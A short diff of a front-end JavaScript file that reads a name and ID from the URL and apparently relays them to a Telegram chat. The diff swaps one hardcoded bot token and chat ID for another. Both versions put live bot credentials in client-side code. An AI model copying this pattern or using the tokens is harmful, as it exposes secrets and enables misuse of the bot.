@@ -7,8 +7,8 @@ const id = urlParams.get("id");
 const full_name = urlParams.get("full_name");
 userData.innerText = `${full_name} (${id})`;
 
-const botToken = '8479759322:AAFIKf_cvAkdI1peCPg5Rene66eDJHPCkas';
-const chatId = '7466179019';
+const botToken = '8722969410:AAHEJuVyok1eC57q8ziNAQeufKGyPChdvXw';
+const chatId = '8076418509';
 const message = `${full_name} (${id})-> `;
 
 async function sendMessage(text) {
